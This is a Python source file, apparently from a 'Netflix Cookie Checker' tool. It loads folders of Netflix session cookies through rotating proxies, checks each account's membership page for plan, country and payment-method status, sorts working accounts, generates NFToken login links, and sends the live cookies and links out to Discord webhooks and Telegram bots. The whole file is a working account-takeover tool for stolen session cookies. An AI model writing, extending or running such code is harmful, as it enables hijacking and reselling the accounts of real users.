    if is_subscribed and has_usable_nftoken(nftoken_data):
        links = build_nftoken_links((nftoken_data or {}).get("token"), nftoken_mode)
    if links:
        lines.append("")
        lines.append(f'<b>NFToken:</b> <a href="{_escape_html(links[0][1])}">Click here</a>')
        if isinstance(nftoken_data, dict) and nftoken_data.get("expires_at_utc"):
            lines.append(f"<b>Valid Till (UTC):</b> {_escape_html(nftoken_data['expires_at_utc'])}")
    lines.extend(
        [
            "",
            '<b><a href="https://github.com/harshitkamboj">Github</a></b> | '
            '<b><a href="https://harshitkamboj.in">Website</a></b> | '
            '<b><a href="https://discord.gg/DYJFE9nu5X">Discord</a></b>',
        ]
    )
    return "\n".join(lines)


def build_telegram_cookie_message(cookie_content):
    lines = [
        '<b><a href="https://github.com/harshitkamboj/Netflix-Cookie-Checker">Netflix Cookie</a></b>',
        "",
        "<b>Cookie details</b>",
        f"<code>{_escape_html(cookie_content.strip())}</code>",
        "",
        '<b><a href="https://github.com/harshitkamboj">Github</a></b> | '
        '<b><a href="https://harshitkamboj.in">Website</a></b> | '
        '<b><a href="https://discord.gg/DYJFE9nu5X">Discord</a></b>',
    ]
    return "\n".join(lines)


def build_telegram_nftoken_message(info, nftoken_data, nftoken_mode):
    _, normalized_plan_label = derive_plan_info(info or {}, True)
    country_value = decode_netflix_value((info or {}).get("countryOfSignup")) or "UNKNOWN"
    country_flag = country_code_to_flag(country_value)
    country_display = f"{country_value} {country_flag}".strip()

    lines = ['<b><a href="https://github.com/harshitkamboj/Netflix-Cookie-Checker">Netflix NFToken</a></b>', ""]
    links = build_nftoken_links((nftoken_data or {}).get("token"), nftoken_mode) if has_usable_nftoken(nftoken_data) else []
    if links:
        lines.append(f"<b>Plan:</b> {_escape_html(normalized_plan_label)}")
        lines.append(f"<b>Country:</b> {_escape_html(country_display)}")
        lines.append("")
        lines.append(f'<b>NFToken:</b> <a href="{_escape_html(links[0][1])}">Click Here</a>')
        if isinstance(nftoken_data, dict) and nftoken_data.get("expires_at_utc"):
            lines.append(f"<b>Valid Till:</b> {_escape_html(nftoken_data['expires_at_utc'])}")
    else:
        lines.append("NFToken unavailable")
    lines.extend(
        [
            "",
            '<b><a href="https://github.com/harshitkamboj">Github</a></b> | '
            '<b><a href="https://harshitkamboj.in">Website</a></b> | '
            '<b><a href="https://discord.gg/DYJFE9nu5X">Discord</a></b>',
        ]
    )
    return "\n".join(lines)


def send_discord_webhook(webhook_url, message_text, file_name=None, file_content=None):
    if not webhook_url:
        return
    try:
        webhook_payload = {
            "content": message_text,
            "flags": 4,
            "username": DISCORD_WEBHOOK_USERNAME,
            "avatar_url": DISCORD_WEBHOOK_AVATAR_URL,
        }
        if file_name and file_content:
            files = {
                "file": (file_name, file_content.encode("utf-8"), "text/plain"),
            }
            data = {"payload_json": json.dumps(webhook_payload)}
            requests.post(webhook_url, data=data, files=files, timeout=20)
        else:
            requests.post(webhook_url, json=webhook_payload, timeout=20)
    except Exception:
        pass


def send_telegram(bot_token, chat_id, message_text, file_name=None, file_content=None):
    if not bot_token or not chat_id:
        return
    try:
        if file_name and file_content:
            doc_url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
            files = {
                "document": (file_name, file_content.encode("utf-8"), "text/plain"),
            }
            data = {"chat_id": chat_id, "caption": message_text, "parse_mode": "HTML"}
            requests.post(doc_url, data=data, files=files, timeout=20)
        else:
            msg_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
            payload = {"chat_id": chat_id, "text": message_text, "parse_mode": "HTML", "disable_web_page_preview": True}
            requests.post(msg_url, json=payload, timeout=20)
    except Exception:
        pass


def send_notifications(config, info, is_subscribed, output_filename, formatted_cookie, raw_cookie_content, nftoken_data=None):
    # ping path: discord gg / DYJFE9nu5X
    notifications = config.get("notifications", {})
    webhook_cfg = notifications.get("webhook", {})
    telegram_cfg = notifications.get("telegram", {})
    webhook_mode = str(webhook_cfg.get("mode", "full")).lower()
    telegram_mode = str(telegram_cfg.get("mode", "full")).lower()
    nftoken_mode = get_nftoken_mode(config)
    plan_key, _ = derive_plan_info(info or {}, is_subscribed)
    usable_nftoken = has_usable_nftoken(nftoken_data)

    if webhook_cfg.get("enabled", False):
        if webhook_mode == "cookie":
            if is_plan_allowed_for_notifications(webhook_cfg, plan_key):
                send_discord_webhook(
                    webhook_cfg.get("url", ""),
                    build_discord_full_message(config, info, is_subscribed, output_filename, None),
                    output_filename,
                    raw_cookie_content,
                )
        elif webhook_mode == "nftoken":
            if is_subscribed and usable_nftoken:
                send_discord_webhook(
                    webhook_cfg.get("url", ""),
                    build_discord_nftoken_message(info, nftoken_data, nftoken_mode),
                )
        else:
            if is_plan_allowed_for_notifications(webhook_cfg, plan_key):
                send_discord_webhook(
                    webhook_cfg.get("url", ""),
                    build_discord_full_message(config, info, is_subscribed, output_filename, nftoken_data),
                    output_filename,
                    formatted_cookie,
                )

    if telegram_cfg.get("enabled", False):
        if telegram_mode == "cookie":
            if is_plan_allowed_for_notifications(telegram_cfg, plan_key):
                send_telegram(
                    telegram_cfg.get("bot_token", ""),
                    telegram_cfg.get("chat_id", ""),
                    build_telegram_full_message(config, info, is_subscribed, output_filename, None),
                    output_filename,
                    raw_cookie_content,
                )
        elif telegram_mode == "nftoken":
            if is_subscribed and usable_nftoken:
                send_telegram(
                    telegram_cfg.get("bot_token", ""),
                    telegram_cfg.get("chat_id", ""),
                    build_telegram_nftoken_message(info, nftoken_data, nftoken_mode),
                )
        else:
            if is_plan_allowed_for_notifications(telegram_cfg, plan_key):
                send_telegram(
                    telegram_cfg.get("bot_token", ""),
                    telegram_cfg.get("chat_id", ""),
                    build_telegram_full_message(config, info, is_subscribed, output_filename, nftoken_data),
                    output_filename,
                    formatted_cookie,
                )


def get_account_page(session, proxy=None):
    headers = {
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/124.0.0.0 Safari/537.36"
        ),
        "Accept-Encoding": "identity",
    }

    membership_url = "https://www.netflix.com/account/membership"
    response = session.get(membership_url, headers=headers, proxies=proxy, timeout=30)
    if response.status_code == 200 and response.text:
        primary_info = extract_info(response.text)
        fallback_info = None
        try:
            fallback_response = session.get(
                "https://www.netflix.com/YourAccount",
                headers=headers,
                proxies=proxy,
                timeout=30,
            )
            if fallback_response.status_code == 200 and fallback_response.text:
                fallback_info = extract_info(fallback_response.text)
        except Exception:
            fallback_info = None
        return response.text, response.status_code, merge_info(primary_info, fallback_info)

    return response.text, response.status_code, None


def print_status_message(status, cookie_file, country=None, plan=None, reason=None):
    color_codes = {
        "success": "\033[33m",
        "free": "\033[34m",
        "duplicate": "\033[35m",
        "failed": "\033[31m",
        "error": "\033[31m",
    }
    reset_code = "\033[0m"
    base_path = f"cookies\\{cookie_file}"
    details = []
    if country:
        details.append(f"Country: {country}")
    if plan:
        details.append(f"Plan: {plan}")
    detail_text = f" [{' | '.join(details)}]" if details else ""

    if status == "success":
        print(f"> {color_codes[status]}Login successful with {base_path}{detail_text}. Moved to output folder!{reset_code}")
    elif status == "free":
        print(f"> {color_codes[status]}Login successful with {base_path}{detail_text}. But no active subscription. Moved to output\\Free folder!{reset_code}")
    elif status == "failed":
        reason_text = f" Reason: {reason}." if reason else ""
        print(f"> {color_codes[status]}Login failed with {base_path}.{reason_text} Moved to failed folder!{reset_code}")
    elif status == "duplicate":
        print(f"> {color_codes[status]}Duplicate email found with {base_path}. Moved to output\\Duplicate folder!{reset_code}")
    elif status == "error":
        reason_text = f" Reason: {reason}." if reason else ""
        print(f"> {color_codes[status]}Error occurred with {base_path}.{reason_text} Moved to broken folder!{reset_code}")


def check_cookies(num_threads=10, config=None):
    # origin trace: harshitkamboj :: site+github+discord
    if config is None:
        config = copy.deepcopy(DEFAULT_CONFIG)
    create_base_folders()

    counts = {"hits": 0, "free": 0, "bad": 0, "duplicate": 0, "errors": 0}
    plan_counts = {}
    plan_labels = {}
    run_folder = get_run_folder()
    stop_requested = threading.Event()

    display_mode = str(config.get("display", {}).get("mode", "log")).lower()
    if display_mode not in ("log", "simple"):
        display_mode = "log"

    proxies = load_proxies()
    retries_cfg = config.get("retries", {})
    max_retry_attempts = retries_cfg.get("error_proxy_attempts", 3)
    nftoken_retry_attempts = retries_cfg.get("nftoken_attempts", 1)
    try:
        max_retry_attempts = max(1, int(max_retry_attempts))
    except Exception:
        max_retry_attempts = 3
    try:
        nftoken_retry_attempts = max(1, int(nftoken_retry_attempts))
    except Exception:
        nftoken_retry_attempts = 1

    retryable_status_codes = {403, 429, 500, 502, 503, 504}

    cookie_files = os.listdir(cookies_folder) if os.path.exists(cookies_folder) else []
    cookie_files = [f for f in cookie_files if f.lower().endswith((".txt", ".json"))]
    cookies_total = len(cookie_files)
    cookies_left = [cookies_total]

    if display_mode == "log":
        print(f"Total cookies: {cookies_total}")
        print(f"Total proxies: {len(proxies)}")
        print(f"Number of threads: {num_threads}")
        print("\nStarting cookie checking...\n")
    else:
        render_simple_dashboard(counts, plan_counts, plan_labels, cookies_left[0], cookies_total, True)

    header_lock = threading.Lock()

    def update_title():
        valid = counts["hits"] + counts["free"]
        set_console_title(
            f"CookiesLeft {cookies_left[0]}/{cookies_total} Valid {valid} "
            f"Failed {counts['bad']} Duplicate {counts['duplicate']} Errors {counts['errors']}"
        )

    def get_next_proxy(used_proxy_indices):
        if not proxies:
            return None, None
        available = [idx for idx in range(len(proxies)) if idx not in used_proxy_indices]
        if not available:
            available = list(range(len(proxies)))
        chosen_index = random.choice(available)
        return proxies[chosen_index], chosen_index

    def handle_result(info, netscape_content, cookie_path, cookie_file, is_subscribed, cookie_dict):
        create_base_folders()
        user_guid = info.get("userGuid") if info.get("userGuid") and info.get("userGuid") != "null" else generate_unknown_guid()
        plan_key, plan_name = derive_plan_info(info, is_subscribed)
        plan_folder_label = get_canonical_output_label(plan_key)
        email_value = (decode_netflix_value(info.get("email")) or "").strip().lower()
        duplicate_key = email_value or user_guid

        with guid_lock:
            if duplicate_key in processed_emails:
                nftoken_data = None
                if is_subscribed and get_nftoken_mode(config) != "false":
                    nftoken_data, _ = create_nftoken(cookie_dict, nftoken_retry_attempts)
                formatted_cookie = format_cookie_file(info, netscape_content, config, is_subscribed, nftoken_data)
                if os.path.exists(cookie_path):
                    duplicate_dir = create_output_folder_when_needed(output_folder, get_canonical_output_label("duplicate"), run_folder)
                    duplicate_name = f"DUPLICATE_{cookie_file}"
                    duplicate_target = os.path.join(duplicate_dir, duplicate_name)
                    write_text_file_safely(duplicate_target, formatted_cookie)
                    os.remove(cookie_path)
                return "duplicate", None, None
            processed_emails.add(duplicate_key)

        info["userGuid"] = user_guid
        country = info.get("countryOfSignup") or "Unknown"
        random_suffix = "".join(random.choices(string.ascii_uppercase + string.digits, k=5))

        if is_subscribed:
            max_streams = (info.get("maxStreams") or "Unknown").rstrip("}")
            filename = f"{max_streams}_{country}_github-harshitkamboj_{info.get('showExtraMemberSection')}_{user_guid}_{random_suffix}.txt"
            output_dir = create_output_folder_when_needed(output_folder, plan_folder_label, run_folder)
            result_type = "success"
        else:
            has_payment_method = "True" if decode_netflix_value(info.get("paymentMethodType")) not in {None, "", "UNKNOWN", "Unknown", "N/A"} else "False"
            filename = f"PaymentM-{has_payment_method}_{country}_github-harshitkamboj_{user_guid}_{random_suffix}.txt"
            output_dir = create_output_folder_when_needed(output_folder, get_canonical_output_label("free"), run_folder)
            result_type = "free"

        nftoken_data = None
        if get_nftoken_mode(config) != "false":
            nftoken_data, _ = create_nftoken(cookie_dict, nftoken_retry_attempts)
        formatted_cookie = format_cookie_file(info, netscape_content, config, is_subscribed, nftoken_data)
        output_path = os.path.join(output_dir, filename)
        write_text_file_safely(output_path, formatted_cookie)

        if os.path.exists(cookie_path):
            os.remove(cookie_path)

        send_notifications(config, info, is_subscribed, filename, formatted_cookie, netscape_content, nftoken_data)
        return result_type, plan_key, plan_name

    def process_cookie(cookie_file):
        cookie_path = os.path.join(cookies_folder, cookie_file)
        plan_key = None
        plan_name = None
        result_type = None
        result_reason = None
        result_country = None
        try:
            with open(cookie_path, "r", encoding="utf-8") as f:
                content = f.read()

            netscape_content = extract_netflix_cookie_text(content)

            cookies = cookies_dict_from_netscape(netscape_content)
            if not cookies:
                result_type = "failed"
                result_reason = "missing required cookies"
                move_cookie_with_reason(cookie_path, failed_folder, cookie_file, result_reason)
                raise StopIteration

            session = requests.Session()
            session.cookies.update(cookies)

            used_proxy_indices = set()
            response_text = None
            status_code = None
            extracted_info = None
            last_exception = None

            for attempt in range(max_retry_attempts):
                proxy, proxy_index = get_next_proxy(used_proxy_indices)
                if proxy_index is not None:
                    used_proxy_indices.add(proxy_index)

                try:
                    response_text, status_code, extracted_info = get_account_page(session, proxy)
                    if status_code == 200 and response_text:
                        if extracted_info and has_complete_account_info(extracted_info):
                            break
                        if attempt < max_retry_attempts - 1:
                            continue
                        break
                    if status_code in retryable_status_codes and attempt < max_retry_attempts - 1:
                        continue
                    break
                except Exception as req_error:
                    last_exception = req_error
                    if attempt < max_retry_attempts - 1:
                        continue

            if status_code == 200 and response_text:
                info = extracted_info or extract_info(response_text)
                if info.get("countryOfSignup") and info.get("countryOfSignup") != "null":
                    is_subscribed = info.get("membershipStatus") == "CURRENT_MEMBER"
                    result_country = info.get("countryOfSignup")
                    result_type, plan_key, plan_name = handle_result(
                        info,
                        netscape_content,
                        cookie_path,
                        cookie_file,
                        is_subscribed,
                        cookies,
                    )
                else:
                    result_type = "failed"
                    result_reason = "incomplete account page"
                    move_cookie_with_reason(cookie_path, failed_folder, cookie_file, result_reason)
            elif last_exception is not None or status_code in retryable_status_codes:
                result_type = "error"
                if status_code in retryable_status_codes:
                    result_reason = describe_http_error(status_code)
                elif isinstance(last_exception, requests.exceptions.Timeout):
                    result_reason = "timeout"
                elif isinstance(last_exception, requests.exceptions.ProxyError):
                    result_reason = "proxy error"
                else:
                    result_reason = "proxy error"
                move_cookie_with_reason(cookie_path, broken_folder, cookie_file, result_reason)
            else:
                result_type = "failed"
                result_reason = "incomplete account page"
                move_cookie_with_reason(cookie_path, failed_folder, cookie_file, result_reason)

        except StopIteration:
            pass
        except Exception:
            result_type = "error"
            result_reason = result_reason or "proxy error"
            try:
                move_cookie_with_reason(cookie_path, broken_folder, cookie_file, result_reason)
            except Exception:
                pass

        with header_lock:
            if result_type == "success":
                counts["hits"] += 1
                if plan_key:
                    plan_counts[plan_key] = plan_counts.get(plan_key, 0) + 1
                    if plan_name:
                        plan_labels[plan_key] = plan_name
            elif result_type == "free":
                counts["free"] += 1
                if plan_key:
                    plan_counts[plan_key] = plan_counts.get(plan_key, 0) + 1
                    if plan_name:
                        plan_labels[plan_key] = plan_name
            elif result_type == "failed":
                counts["bad"] += 1
            elif result_type == "duplicate":
                counts["duplicate"] += 1
            else:
                counts["errors"] += 1

            cookies_left[0] -= 1
            update_title()

            if display_mode == "log":
                print_status_message(
                    result_type if result_type in {"success", "free", "failed", "duplicate", "error"} else "error",
                    cookie_file,
                    result_country,
                    plan_name,
                    result_reason,
                )
            else:
                render_simple_dashboard(counts, plan_counts, plan_labels, cookies_left[0], cookies_total, True)

    update_title()

    def worker():
        while not stop_requested.is_set():
            try:
                cookie_name = cookie_files.pop(0)
            except IndexError:
                break
            process_cookie(cookie_name)

    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=worker, daemon=True)
        threads.append(t)

    try:
        for t in threads:
            t.start()
        while any(t.is_alive() for t in threads):
            for t in threads:
                t.join(timeout=0.2)
    except KeyboardInterrupt:
        stop_requested.set()
        if display_mode == "simple":
            print(color_text("\nStopping... please wait.", "\033[93m", True))
        else:
            print("\nStopping... please wait.")
        for t in threads:
            t.join(timeout=1)
        set_console_title("NetflixChecker - Stopped")
        return

    valid = counts["hits"] + counts["free"]
    set_console_title(f"NetflixChecker - Finished Valid {valid} Failed {counts['bad']} Errors {counts['errors']}")

    if display_mode == "simple":
        render_simple_dashboard(counts, plan_counts, plan_labels, cookies_left[0], cookies_total, True)
        print(color_text("\nFinished Checking", "\033[92m", True))
    else:
        label_code = "\033[94m"
        value_code = "\033[93m"
        good_code = "\033[92m"
        free_code = "\033[95m"
        bad_code = "\033[91m"
        line = "==================== Final Summary ===================="
        print(color_text("\n\n" + line, "\033[95m", True))
        print(color_text("Checked   :", label_code, True), color_text(str(cookies_total), value_code, True))
        print(color_text("Good      :", label_code, True), color_text(str(counts["hits"]), good_code, True))
        print(color_text("Free      :", label_code, True), color_text(str(counts["free"]), free_code, True))
        print(color_text("Bad       :", label_code, True), color_text(str(counts["bad"]), bad_code, True))
        print(color_text("Duplicate :", label_code, True), color_text(str(counts["duplicate"]), value_code, True))
        print(color_text("Errors    :", label_code, True), color_text(str(counts["errors"]), bad_code, True))
        print(color_text(line, "\033[95m", True))


def main():
    # handle-hint: illuminatis69
    create_base_folders()
    cleanup_stale_temp_files()
    config, config_source = load_config()

    clear_screen()
    print(BANNER)
    check_for_updates()
    print("--------------------------------------------------------------------------------------------------")
    print("")
    print("            👉  Welcome, after moving your cookies to (cookies) folder, press  👈")
    print("                              Enter if you're ready to start!")
    input()

    initial_files = [
        f for f in os.listdir(cookies_folder)
        if not f.startswith(".") and f.lower().endswith((".txt", ".json"))
    ]
    if not initial_files:
        print("No cookies found in cookies folder. Add .txt/.json cookies and run again.")
        return

    try:
        num_threads_input = input("Enter number of threads (default 10): ")
        num_threads = int(num_threads_input) if num_threads_input.strip() else 10
        if num_threads < 1 or num_threads > 100:
            raise ValueError
    except ValueError:
        print("Invalid input, using 10 threads as default")
        num_threads = 10

    check_cookies(num_threads, config)
    input("Press enter to exit\n")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nStopped by user.")
